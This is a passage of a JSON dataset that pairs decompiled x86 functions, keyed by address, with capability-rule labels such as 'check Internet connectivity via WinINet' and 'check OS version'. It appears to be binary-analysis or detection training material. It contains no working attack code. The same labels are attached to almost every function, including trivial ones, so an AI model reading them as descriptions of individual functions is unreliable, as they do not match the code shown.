}\n        }\n    }\n    var_4h = 0xffffffff;\n    if (var_148h != 0) {\n        fcn.00078544(var_148h);\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return var_14ch;\n}\n",
        "token_count": 760
    },
    "0005df60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0005df60(uint param_1, int32_t param_2, uint32_t param_3, uint32_t *param_4)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    int32_t var_ch;\n    uint32_t var_10h;\n    uint32_t *var_14h;\n    uint var_18h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint32_t *var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c45920;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xffffffc0;\n    if (var_ch == 0) {\n        var_30h = 0x21590066;\n    }\n    else if (var_14h == NULL) {\n        var_30h = 0x21590068;\n    }\n    else {\n        iVar1 = fcn.00078538(var_ch, 0xb1be27d8, 4);\n        if (iVar1 == 0) {\n            var_1ch = var_ch + 8;\n            iVar1 = fcn.0005c520(var_8h, 0xb1be27e4, 0, &var_2ch, 0);\n            if (iVar1 == 0) {\n                var_30h = fcn.0005ba60(var_2ch, 0xb1be2808, 0, 0, &var_24h, 0);\n                if (var_30h == 0) {\n                    var_4h = 0;\n                    var_20h = 0;\n                    while ((var_20h < *(var_24h + 4) &&\n                           (iVar1 = fcn.00078538(var_1ch, var_24h + *(var_24h + 8 + var_20h * 0xc), \n                                                 *(var_24h + 0xc + var_20h * 0xc) >> 1),  iVar1 != 0))) {\n                        var_20h = var_20h + 1;\n                    }\n                    if (var_20h < *(var_24h + 4)) {\n                        var_28h = var_24h + *(var_24h + 0x10 + var_20h * 0xc);\n                        if (*var_28h == 0) {\n                            *var_14h = 0xffffffff;\n                            var_30h = 0;\n                            var_4h = 0xffffffff;\n                        }\n                        else if (*var_14h < *var_28h) {\n                            if (var_10h < var_28h[*var_14h * 4 + 4] + 2) {\n                                var_30h = 0x2159000b;\n                                var_4h = 0xffffffff;\n                            }\n                            else {\n                                fcn.0007877e(var_ch, var_24h + var_28h[*var_14h * 4 + 3], var_28h[*var_14h * 4 + 4]);\n                                *(var_ch + (var_28h[*var_14h * 4 + 4] & 0xfffffffe)) = 0;\n                                if (*var_14h < *var_28h - 1) {\n                                    *var_14h = *var_14h + 1;\n                                }\n                                else {\n                                    *var_14h = 0xffffffff;\n                                }\n                                var_30h = 0;\n                                var_4h = 0xffffffff;\n                            }\n                        }\n                        else {\n                            var_30h = 0x2159000e;\n                            var_4h = 0xffffffff;\n                        }\n                    }\n                    else {\n                        *var_14h = 0xffffffff;\n                        var_30h = 0;\n                        var_4h = 0xffffffff;\n                    }\n                }\n                fcn.00035330(var_2ch);\n            }\n            else {\n                *var_14h = 0xffffffff;\n                var_30h = 0;\n            }\n        }\n        else {\n            *var_14h = 0xffffffff;\n            var_30h = 0;\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return var_30h;\n}\n",
        "token_count": 1063
    },
    "0005ec00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Switch with 1 destination removed at 0x0005eff5\n// WARNING: Switch with 1 destination removed at 0x0005f0e1\n\nvoid __cdecl\nfcn.0005ec00(int32_t arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h, uint32_t arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uchar uVar4;\n    uint uVar5;\n    uint var_ch;\n    uint var_8h;\n    uint var_3h;\n    \n    fcn.00060830(arg_8h);\n    cVar1 = *(arg_8h + 0x112 + *(arg_8h + 4)) >> 6;\n    uVar2 = *(arg_8h + 0x112 + *(arg_8h + 4)) & 7;\n    uVar3 = (*(arg_8h + 0x101) & 1) << 3 | uVar2;\n    uVar4 = fcn.0005e1e0(arg_8h, arg_10h);\n    *(arg_ch + 1) = uVar4;\n    if (cVar1 == '\\x03') {\n        *arg_ch = 0x8c;\n        if (arg_14h == 1) {\n            uVar5 = fcn.0005e8c0(arg_8h, *(arg_ch + 1));\n            arg_ch[4] = uVar5;\n        }\n        else {\n            uVar5 = fcn.0005ea90(arg_8h, arg_14h);\n            arg_ch[4] = uVar5;\n        }\n    }\n    else {\n        *arg_ch = 0x8d;\n        if (*(arg_8h + 0x10c) == '@') {\n            arg_ch[4] = uVar3 + 0x35;\n            if (cVar1 == '\\x01') {\n                *(arg_ch + 6) = 8;\n            }\n            else if (cVar1 == '\\x02') {\n                *(arg_ch + 6) = 0x20;\n            }\n            else if ((cVar1 == '\\0') && (uVar3 == 5)) {\n                arg_ch[4] = 0x8b;\n                *(arg_ch + 6) = 0x20;\n            }\n            else {\n                *(arg_ch + 6) = 0;\n            }\n            if (uVar2 == 4) {\n                fcn.00060830(arg_8h);\n                *(arg_ch + 0x19) = 1 << (*(arg_8h + 0x112 + *(arg_8h + 4)) >> 6) & 0xfe;\n                arg_ch[5] = (*(arg_8h + 0x112 + *(arg_8h + 4)) >> 3 & 7U | ((*(arg_8h + 0x101) & 3) >> 1) << 3) + 0x35;\n                arg_ch[4] = (*(arg_8h + 0x112 + *(arg_8h + 4)) & 7 | (*(arg_8h + 0x101) & 1) << 3) + 0x35;\n                if (arg_ch[5] == 0x39) {\n                    arg_ch[5] = 0;\n                    *(arg_ch + 0x19) = 0;\n                }\n                if ((arg_ch[4] == 0x3a) || (arg_ch[4] == 0x42)) {\n                    if (cVar1 == '\\0') {\n                        arg_ch[4] = 0;\n                    }\n                    if (cVar1 == '\\x01') {\n                        *(arg_ch + 6) = 8;\n                    }\n                    else {\n                        *(arg_ch + 6) = 0x20;\n                    }\n                }\n            }\n        }\n        else if (*(arg_8h + 0x10c) == ' ') {\n            arg_ch[4] = uVar3 + 0x25;\n            if (cVar1 == '\\x01') {\n                *(arg_ch + 6) = 8;\n            }\n            else if (cVar1 == '\\x02') {\n                *(arg_ch + 6) = 0x20;\n            }\n            else if ((cVar1 == '\\0') && (uVar3 == 5)) {\n                arg_ch[4] = 0;\n                *(arg_ch + 6) = 0x20;\n            }\n            else {\n                *(arg_ch + 6) = 0;\n            }\n            if (uVar2 == 4) {\n                fcn.00060830(arg_8h);\n                *(arg_ch + 0x19) = 1 << (*(arg_8h + 0x112 + *(arg_8h + 4)) >> 6) & 0xfe;\n                arg_ch[5] = (*(arg_8h + 0x112 + *(arg_8h + 4)) >> 3 & 7U | ((*(arg_8h + 0x101) & 3) >> 1) << 3) + 0x25;\n                arg_ch[4] = (*(arg_8h + 0x112 + *(arg_8h + 4)) & 7 | (*(arg_8h + 0x101) & 1) << 3) + 0x25;\n                if (arg_ch[5] == 0x29) {\n                    arg_ch[5] = 0;\n                    *(arg_ch + 0x19) = 0;\n                }\n                if (arg_ch[4] == 0x2a) {\n                    if (cVar1 == '\\0') {\n                        arg_ch[4] = 0;\n                    }\n                    if (cVar1 == '\\x01') {\n                        *(arg_ch + 6) = 8;\n                    }\n                    else {\n                        *(arg_ch + 6) = 0x20;\n                    }\n                }\n            }\n        }\n        else {\n            if (uVar3 < 8) {\n                return;\n            }\n            if ((cVar1 == '\\0') && (uVar3 == 6)) {\n                *(arg_ch + 6) = 0x10;\n            }\n            else if (cVar1 == '\\x01') {\n                *(arg_ch + 6) = 8;\n            }\n            else if (cVar1 == '\\x02') {\n                *(arg_ch + 6) = 0x10;\n            }\n        }\n    }\n    if (*(arg_ch + 6) - 8 < 0x39) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (arg_18h != NULL) {\n        *arg_18h = 0x8c;\n        uVar4 = fcn.0005e1e0(arg_8h, arg_1ch & 0xff);\n        *(arg_18h + 1) = uVar4;\n        if (arg_20h == 1) {\n            uVar5 = fcn.0005e8c0(arg_8h, *(arg_18h + 1));\n            arg_18h[4] = uVar5;\n        }\n        else {\n            uVar5 = fcn.0005ea90(arg_8h, arg_20h);\n            arg_18h[4] = uVar5;\n        }\n    }\n    return;\n}\n",
        "token_count": 1721
    },
    "0005ffa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00060074\n\nuchar __cdecl fcn.0005ffa0(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uchar uVar3;\n    uint uVar4;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uchar *var_8h;\n    uint var_4h;\n    \n    *(arg_8h + 0xc) = 0;\n    fcn.0005feb0(arg_8h);\n    fcn.00060830(arg_8h);\n    var_ch = 0;\n    bVar2 = false;\n    do {\n        if (bVar2) {\ncode_r0x000601b0:\n            fcn.00060900(arg_8h);\n            fcn.000615a0(arg_8h);\n            if (*(arg_8h + 0x8c) == '@') {\n                *(arg_8h + 0x101) = *(arg_8h + 0x101) & (*(*(arg_8h + 0x98) + 0x1c) >> 0x10 & 0xf | 0x40);\n                *(arg_8h + 0x10a) = *(*(arg_8h + 0x98) + 0x1c) & 8;\n                *(arg_8h + 0x100) = *(*(arg_8h + 0x98) + 0x1c) & 0x10;\n                if (((*(*(arg_8h + 0x98) + 0x1c) & 0xff0000) == 0) || ((*(arg_8h + 0x101) & 0xf) >> 3 == 0)) {\n                    if (*(arg_8h + 0x103) == '\\0') {\n                        *(arg_8h + 0x10b) = (-(*(arg_8h + 0x10a) != '\\0') & 0x20U) + 0x20;\n                    }\n                    else {\n                        *(arg_8h + 0x10b) = 0x10;\n                    }\n                }\n                else {\n                    *(arg_8h + 0x10b) = 0x40;\n                }\n                *(arg_8h + 0x10c) = (-(*(arg_8h + 0x104) != '\\0') & 0xe0U) + 0x40;\n            }\n            else if (*(arg_8h + 0x8c) == ' ') {\n                *(arg_8h + 0x10b) = (-(*(arg_8h + 0x103) != '\\0') & 0xf0U) + 0x20;\n                *(arg_8h + 0x10c) = (-(*(arg_8h + 0x104) != '\\0') & 0xf0U) + 0x20;\n            }\n            else if (*(arg_8h + 0x8c) == '\\x10') {\n                *(arg_8h + 0x10b) = (-(*(arg_8h + 0x103) != '\\0') & 0x10U) + 0x10;\n                *(arg_8h + 0x10c) = (-(*(arg_8h + 0x104) != '\\0') & 0x10U) + 0x10;\n            }\n            if (((*(*(arg_8h + 0x98) + 0x1c) & 4) == 0) && (*(arg_8h + 0x103) != '\\0')) {\n                *(arg_8h + 0x100) = 1;\n            }\n            if (((*(*(arg_8h + 0x98) + 0x1c) & 1) == 0) && (*(arg_8h + 0x104) != '\\0')) {\n                *(arg_8h + 0x100) = 1;\n            }\n            *(arg_8h + 0x10f) = (*(*(arg_8h + 0x98) + 0x1c) & 0x20) != 0;\n            *(arg_8h + 0x110) = (*(*(arg_8h + 0x98) + 0x1c) & 0x40) != 0;\n            *(arg_8h + 0x111) = (*(*(arg_8h + 0x98) + 0x1c) & 0x80) != 0;\n            fcn.0005f2b0(arg_8h);\n            if ((*(*(arg_8h + 0x98) + 0x1c) & 0x100) != 0) {\n                uVar4 = fcn.0005e2b0(arg_8h);\n                *(arg_8h + 0x9c) = uVar4;\n            }\n            *(arg_8h + 0x10d) = 0;\n            *(arg_8h + 0x10e) = 0;\n            if ((*(arg_8h + 0x9c) == 0x18) || (*(arg_8h + 0x9c) == 0xde)) {\n                if (*(arg_8h + 0xa4) == '\\x04') {\n                    *(arg_8h + 0xa4) = 0x10;\n                    *(arg_8h + 0x10d) = 1;\n                    *(arg_8h + 0x10e) = 0;\n                }\n                else if (*(arg_8h + 0xa4) == '\\x05') {\n                    *(arg_8h + 0xa4) = 0x20;\n                    *(arg_8h + 0x10d) = 1;\n                    *(arg_8h + 0x10e) = 0;\n                }\n                else {\n                    *(arg_8h + 0x10d) = 0;\n                    *(arg_8h + 0x10e) = 1;\n                }\n            }\n            else if (*(arg_8h + 0x9c) == 0x220) {\n                uVar4 = fcn.00060cb0(arg_8h & 0xffffff00 | *(arg_8h + 0x112 + *(arg_8h + 4)));\n                *(arg_8h + 0x9c) = uVar4;\n            }\n            if (*(arg_8h + 0x100) != '\\0') {\n                fcn.0005feb0(arg_8h);\n                *(arg_8h + 4) = *(arg_8h + 4) - *(arg_8h + 0xc);\n                *(arg_8h + 0xc) = 0;\n                uVar3 = fcn.00060960(arg_8h);\n                *(arg_8h + 0xa8) = uVar3;\n                if (*(arg_8h + 0xa8) == 'f') {\n                    *(arg_8h + 0x9c) = 0x218;\n                }\n                else if (*(arg_8h + 0xa8) == 'g') {\n                    *(arg_8h + 0x9c) = 0x217;\n                }\n                else {\n                    *(arg_8h + 0x9c) = 0x221;\n                    *(arg_8h + 0xa0) = 0x8f;\n                    *(arg_8h + 0xa4) = 8;\n                }\n            }\n            *(arg_8h + 0x20) = *(arg_8h + 0x90);\n            *(arg_8h + 0x24) = *(arg_8h + 0x94);\n            *(arg_8h + 0x88) = 0;\n            var_8h = arg_8h + 0x212;\n            var_10h = arg_8h + 0x28;\n            for (var_ch = 0; var_ch < *(arg_8h + 0xc); var_ch = var_ch + 1) {\n                fcn.0007865e(var_10h, 0xb1be2810, *var_8h);\n                var_10h = var_10h + 2;\n                var_8h = var_8h + 1;\n            }\n            uVar1 = *(arg_8h + 0x90);\n            *(arg_8h + 0x90) = *(arg_8h + 0xc) + *(arg_8h + 0x90);\n            *(arg_8h + 0x94) = *(arg_8h + 0x94) + CARRY4(*(arg_8h + 0xc), uVar1);\n            return *(arg_8h + 0xc);\n        }\n        if ((*(arg_8h + 0x112 + *(arg_8h + 4)) & 0xf0) == 0x40) {\n            if (*(arg_8h + 0x8c) == '@') {\n                *(arg_8h + 0x101) = *(arg_8h + 0x112 + *(arg_8h + 4));\n                fcn.00060830(arg_8h);\n            }\n            else {\n                bVar2 = true;\n            }\n        }\n        else {\n            if (*(arg_8h + 0x112 + *(arg_8h + 4)) - 0x26 < 0xce) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            bVar2 = true;\n        }\n        if (0xe < var_ch) {\n            *(arg_8h + 0x100) = 1;\n            goto code_r0x000601b0;\n        }\n        var_ch = var_ch + 1;\n    } while( true );\n}\n",
        "token_count": 2272
    },
    "00060bb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00060bb0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.000607f0(arg_8h);\n    if (iVar1 == 0) {\n        *(arg_8h + 0x28) = 0;\n        *(arg_8h + 0x48) = 0;\n        iVar1 = fcn.0005ffa0(arg_8h);\n        if (iVar1 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            if (*(arg_8h + 0x1c) != 0) {\n                (**(arg_8h + 0x1c))(arg_8h);\n            }\n            uVar2 = fcn.00060ca0(arg_8h);\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 212
    },
    "00061080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00061080(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00060830(arg_8h);\n    if (*(arg_8h + 0x109) == 'f') {\n        *(arg_8h + 0x98) = *(arg_8h + 0x112 + *(arg_8h + 4)) * 0x20 + -0x4e3b3b48;\n        if ((*(arg_8h + 0x98) != 0) && (**(arg_8h + 0x98) != 0x244)) {\n            *(arg_8h + 0x103) = 0;\n        }\n    }\n    else if (*(arg_8h + 0x109) == -0xe) {\n        *(arg_8h + 0x98) = *(arg_8h + 0x112 + *(arg_8h + 4)) * 0x20 + -0x4e3b1b48;\n        if ((*(arg_8h + 0x98) != 0) && (**(arg_8h + 0x98) != 0x244)) {\n            *(arg_8h + 0x108) = 0;\n        }\n    }\n    else if (((*(arg_8h + 0x109) == -0xd) &&\n             (*(arg_8h + 0x98) = *(arg_8h + 0x112 + *(arg_8h + 4)) * 0x20 + -0x4e3b5b48,  *(arg_8h + 0x98) != 0)) &&\n            (**(arg_8h + 0x98) != 0x244)) {\n        *(arg_8h + 0x106) = 0;\n    }\n    if ((*(arg_8h + 0x98) == 0) || (**(arg_8h + 0x98) == 0x244)) {\n        *(arg_8h + 0x98) = *(arg_8h + 0x112 + *(arg_8h + 4)) * 0x20 + -0x4e3b7b48;\n    }\n    if (**(arg_8h + 0x98) == 0x220) {\n        *(arg_8h + 0x98) = 0xb1c57a18;\n    }\n    if (**(arg_8h + 0x98) == 0x216) {\n        iVar1 = *(*(arg_8h + 0x98) + 0x1c);\n        if ((*(arg_8h + 0x109) == 'f') && (*(iVar1 * 0x10 + -0x4e3ad0e4) != 0)) {\n            uVar4 = fcn.00060930(arg_8h);\n            *(arg_8h + 0x98) = ((uVar4 & 0xff) >> 3 & 7U) * 0x20 + *(iVar1 * 0x10 + -0x4e3ad0e4);\n            if ((*(arg_8h + 0x98) != 0) && (**(arg_8h + 0x98) != 0x244)) {\n                *(arg_8h + 0x103) = 0;\n                return;\n            }\n        }\n        else if ((*(arg_8h + 0x109) == -0xe) && (*(iVar1 * 0x10 + -0x4e3ad0e0) != 0)) {\n            uVar4 = fcn.00060930(arg_8h);\n            *(arg_8h + 0x98) = ((uVar4 & 0xff) >> 3 & 7U) * 0x20 + *(iVar1 * 0x10 + -0x4e3ad0e0);\n            if ((*(arg_8h + 0x98) != 0) && (**(arg_8h + 0x98) != 0x244)) {\n                *(arg_8h + 0x108) = 0;\n                return;\n            }\n        }\n        else if ((*(arg_8h + 0x109) == -0xd) && (*(iVar1 * 0x10 + -0x4e3ad0dc) != 0)) {\n            uVar4 = fcn.00060930(arg_8h);\n            *(arg_8h + 0x98) = ((uVar4 & 0xff) >> 3 & 7U) * 0x20 + *(iVar1 * 0x10 + -0x4e3ad0dc);\n            if ((*(arg_8h + 0x98) != 0) && (**(arg_8h + 0x98) != 0x244)) {\n                *(arg_8h + 0x106) = 0;\n                return;\n            }\n        }\n        if ((*(arg_8h + 0x109) == '\\0') || (**(arg_8h + 0x98) == 0x216)) {\n            uVar4 = fcn.00060930(arg_8h);\n            *(arg_8h + 0x98) = ((uVar4 & 0xff) >> 3 & 7U) * 0x20 + *(iVar1 * 0x10 + -0x4e3ad0e8);\n        }\n        if (*(arg_8h + 0x112 + *(arg_8h + 4)) == '\\x01') {\n            uVar4 = fcn.00060930(arg_8h);\n            uVar5 = (uVar4 & 0xff) >> 3 & 7;\n            uVar4 = fcn.00060930(arg_8h);\n            cVar2 = (uVar4 & 0xff) >> 6;\n            uVar3 = fcn.00060930(arg_8h);\n            if ((uVar5 == 3) && (cVar2 == '\\x03')) {\n                *(arg_8h + 0x98) = (uVar3 & 7) * 0x20 + -0x4e3ae948;\n                fcn.00060830(arg_8h);\n            }\n            else if ((uVar5 == 7) && (cVar2 == '\\x03')) {\n                *(arg_8h + 0x98) = (uVar3 & 7) * 0x20 + -0x4e3aea48;\n                fcn.00060830(arg_8h);\n            }\n            else {\n                *(arg_8h + 0x98) = uVar5 * 0x20 + -0x4e3aeb48;\n            }\n        }\n        else if (*(arg_8h + 0x112 + *(arg_8h + 4)) == -0x52) {\n            uVar4 = fcn.00060930(arg_8h);\n            uVar3 = (uVar4 & 0xff) >> 3 & 7;\n            uVar4 = fcn.00060930(arg_8h);\n            cVar2 = (uVar4 & 0xff) >> 6;\n            if ((uVar3 == 5) && (cVar2 == '\\x03')) {\n                *(arg_8h + 0x98) = 0xb1c52cb8;\n                fcn.00060830(arg_8h);\n            }\n            else if ((uVar3 == 6) && (cVar2 == '\\x03')) {\n                *(arg_8h + 0x98) = 0xb1c52cd8;\n                fcn.00060830(arg_8h);\n            }\n            else if ((uVar3 == 7) && (cVar2 == '\\x03')) {\n                *(arg_8h + 0x98) = 0xb1c52cf8;\n                fcn.00060830(arg_8h);\n            }\n            else {\n                *(arg_8h + 0x98) = uVar3 * 0x20 + -0x4e3ad748;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1902
    },
    "00061630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __fastcall fcn.00061630(uint param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0xb1c67768 == 0) {\n        iVar1 = 0x21590064;\n    }\n    else {\n        iVar1 = fcn.00066c80(param_1);\n        if (iVar1 == 0) {\n            *0xb1c67748 = 1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 126
    },
    "00061670": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00061670(void)\n\n{\n    if (*0xb1c67748 != 0) {\n        fcn.00061960();\n        *0xb1c67748 = 0;\n    }\n    return;\n}\n",
        "token_count": 51
    },
    "00061690": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00061690(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0xb1c67748 == 0) {\n        iVar1 = 0x21590001;\n    }\n    else {\n        iVar1 = fcn.000618d0(arg_8h, arg_ch);\n        if (iVar1 == 0) {\n            *(*arg_ch + 0x6c) = 1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 125
    },
    "000616d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000616d0(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0xb1c67748 == 0) {\n        iVar1 = 0x21590001;\n    }\n    else {\n        iVar1 = fcn.00061840(arg_8h, arg_ch);\n        if (iVar1 == 0) {\n            *(*arg_ch + 0x6c) = 1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 125
    },
    "00061840": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00061840(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00061bd0(*0xb1c67788, arg_8h, &var_8h);\n    if ((var_4h == 0) &&\n       (var_4h = fcn.000625e0((*(*0xb1c6774c + var_8h * 4) - *0xb1c67788) + *0xb1c67750, *0xb1c67788 - *0xb1c67750, 6, 0\n                              , arg_ch),  var_4h == 0)) {\n        *(*arg_ch + 8) = *(*0xb1c6774c + var_8h * 4);\n    }\n    return var_4h;\n}\n",
        "token_count": 224
    },
    "000618d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000618d0(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.0005c850(*0xb1c67788, arg_8h, &var_8h);\n    if (((var_4h == 0) && (var_4h = fcn.0005c850(*0xb1c67750, arg_8h, &var_ch),  var_4h == 0)) &&\n       (var_4h = fcn.000625e0(var_ch, *0xb1c67788 - *0xb1c67750, 6, 0, arg_ch),  var_4h == 0)) {\n        *(*arg_ch + 8) = var_8h;\n    }\n    return var_4h;\n}\n",
        "token_count": 216
    },
    "00061a00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00061a00(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        iVar1 = 0x21590066;\n    }\n    else if (arg_10h == 0) {\n        iVar1 = 0x21590067;\n    }\n    else if (arg_14h == 0) {\n        iVar1 = 0x21590068;\n    }\n    else if (arg_18h == 0) {\n        iVar1 = 0x21590069;\n    }\n    else {\n        iVar1 = fcn.00061bd0(arg_ch, arg_10h, &var_4h);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00061a80(arg_8h, var_4h, arg_14h, arg_18h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 252
    },
    "00061a80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00061a80(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.000620f0(arg_8h, arg_ch, &var_ch, &var_10h, &var_4h);\n    if (var_8h == 0) {\n        var_8h = fcn.000631a0(var_ch, arg_10h, arg_14h);\n        if (var_8h == 0) {\n            *(*arg_14h + 0x70) = arg_8h;\n        }\n        fcn.00062200(var_10h, var_4h);\n    }\n    return var_8h;\n}\n",
        "token_count": 202
    },
    "00061af0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00061af0(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        var_ch = 0x21590066;\n    }\n    else if (arg_10h == 0) {\n        var_ch = 0x21590067;\n    }\n    else if (arg_14h == 0) {\n        var_ch = 0x21590068;\n    }\n    else {\n        var_ch = fcn.00061bd0(arg_ch, arg_10h, &var_4h);\n        if ((var_ch == 0) && (var_ch = fcn.000620f0(arg_8h, var_4h, arg_14h, &var_10h, &var_8h),  var_ch == 0)) {\n            fcn.00062200(var_10h, var_8h);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 257
    },
    "00061b80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
